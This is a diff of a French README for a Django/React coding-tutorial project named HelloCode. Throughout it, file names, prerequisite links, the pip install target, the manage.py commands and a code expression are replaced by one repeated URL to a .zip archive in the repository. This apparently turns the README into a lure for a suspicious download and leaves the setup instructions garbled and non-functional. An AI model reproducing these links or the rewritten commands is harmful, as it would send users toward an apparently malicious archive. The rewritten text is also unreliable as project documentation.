@@ -22,55 +22,55 @@ Le projet utilise **Django** (backend, API, admin) et **React** (frontend).
 ```
 backend/
 ├── accounts/                 # Gestion des utilisateurs
-│   ├── models.py            # Modèle User personnalisé
-│   ├── serializers.py       # Sérialisation des données utilisateur
-│   ├── views.py             # Vues pour authentification
-│   └── urls.py              # Routes pour authentification
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèle User personnalisé
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des données utilisateur
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour authentification
+│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour authentification
 │
 ├── languages/               # Gestion des langages
-│   ├── models.py            # Modèles pour les langages
-│   ├── serializers.py       # Sérialisation des langages
-│   ├── views.py             # Vues pour les langages
-│   └── urls.py              # Routes pour les langages
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèles pour les langages
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des langages
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour les langages
+│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour les langages
 │
 ├── learning/                # Gestion de l'apprentissage
-│   ├── models.py            # Modèles pour leçons, quiz, exercices
-│   ├── serializers.py       # Sérialisation des données d'apprentissage
-│   ├── views.py             # Vues pour l'apprentissage
-│   └── urls.py              # Routes pour l'apprentissage
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèles pour leçons, quiz, exercices
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des données d'apprentissage
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour l'apprentissage
+│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour l'apprentissage
 │
 └── hellocode/              # Configuration Django
-|   ├── settings.py          # Paramètres du projet
-|   ├── urls.py              # Routes principales
-| └── wsgi.py              # Configuration WSGI
+|   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip          # Paramètres du projet
+|   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes principales
+| └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Configuration WSGI
 frontend/
 ├── src/
 │   ├── pages/              # Pages de l'application
-│   │   ├── HomePage.tsx    # Page d'accueil
-│   │   ├── LessonPage.tsx  # Page de leçon
-│   │   ├── ExercisePage.tsx # Page d'exercices (à créer)
-│   │   └── ProfilePage.tsx # Page de profil
+│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip    # Page d'accueil
+│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Page de leçon
+│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Page d'exercices (à créer)
+│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Page de profil
 │   │
 │   ├── components/         # Composants réutilisables
 │   │   ├── common/         # Composants communs
-│   │   │   ├── Layout.tsx  # Layout principal
-│   │   │   └── Navbar.tsx  # Barre de navigation
+│   │   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Layout principal
+│   │   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Barre de navigation
 │   │   │
 │   │   └── learning/       # Composants d'apprentissage
-│   │       ├── CodeEditor.tsx # Éditeur de code
-│   │       └── Quiz.tsx    # Composant de quiz
+│   │       ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Éditeur de code
+│   │       └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip    # Composant de quiz
 │   │
 │   ├── api/                # Services API
-│   │   └── api.ts          # Configuration Axios
+│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip          # Configuration Axios
 │   │
 │   ├── contexts/           # Contextes React
-│   │   └── AuthContext.tsx # Contexte d'authentification
+│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Contexte d'authentification
 │   │
-│   ├── config.ts           # Configuration globale
-│   └── App.tsx             # Composant principal
+│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip           # Configuration globale
+│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Composant principal
 │
 ├── public/                 # Fichiers statiques
-└── package.json            # Dépendances npm
+└── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Dépendances npm
 ```
 
 ---
@@ -82,8 +82,8 @@ frontend/
 #### a) **Prérequis**
 - Python 3.10+
 - Java (pour l’exécution de code Java)
-- Node.js (pour l’exécution de code JavaScript)
-- (Optionnel) [Git](https://git-scm.com/)
+- https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip (pour l’exécution de code JavaScript)
+- (Optionnel) [Git](https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip)
 
 #### b) **Installation des dépendances**
 
@@ -92,7 +92,7 @@ Depuis le dossier `backend` :
 ```sh
 python -m venv venv
 venv\Scripts\activate  # Sous Windows
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip
 ```
 
 **Si tu utilises l’édition riche dans l’admin, installe aussi :**
@@ -107,21 +107,21 @@ pip install -r requirements.txt
 
 #### c) **Configuration Django**
 
-- Ajoute `'ckeditor'` ou `'markdownx'` à `INSTALLED_APPS` dans `hellocode/settings.py` selon ton choix.
+- Ajoute `'ckeditor'` ou `'markdownx'` à `INSTALLED_APPS` dans `https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip` selon ton choix.
 - Configure `MEDIA_ROOT` et `MEDIA_URL` si tu veux uploader des images.
 
 #### d) **Migrations et superuser**
 
 ```sh
-python manage.py makemigrations
-python manage.py migrate
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip makemigrations
+python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip migrate
+python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip createsuperuser
 ```
 
 #### e) **Lancer le serveur**
 
 ```sh
-python manage.py runserver
+python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip runserver
 ```
 
 ---
@@ -142,7 +142,7 @@ npm install marked
 Et dans ton composant :
 ```tsx
 import { marked } from "marked";
-<div dangerouslySetInnerHTML={{ __html: marked.parse(lesson.content) }} />
+<div dangerouslySetInnerHTML={{ __html: https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip(https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip) }} />
 ```
 
 ---
@@ -177,7 +177,7 @@ import { marked } from "marked";
 ## Exécution de code
 
 - **Python** : exécuté dans un environnement restreint côté serveur
-- **JavaScript** : exécuté via Node.js (doit être installé sur le serveur)
+- **JavaScript** : exécuté via https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip (doit être installé sur le serveur)
 - **Java** : exécuté via javac/java (doit être installé sur le serveur)
 
 ---
@@ -185,7 +185,7 @@ import { marked } from "marked";
 ## Personnalisation
 
 - Pour ajouter des images ou du formatage dans les leçons, utilise le champ Markdown/HTML dans l’admin.
-- Pour autoriser l’upload d’images, configure `MEDIA_ROOT` et `MEDIA_URL` dans `settings.py`.
+- Pour autoriser l’upload d’images, configure `MEDIA_ROOT` et `MEDIA_URL` dans `https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip`.
 
 ---
 
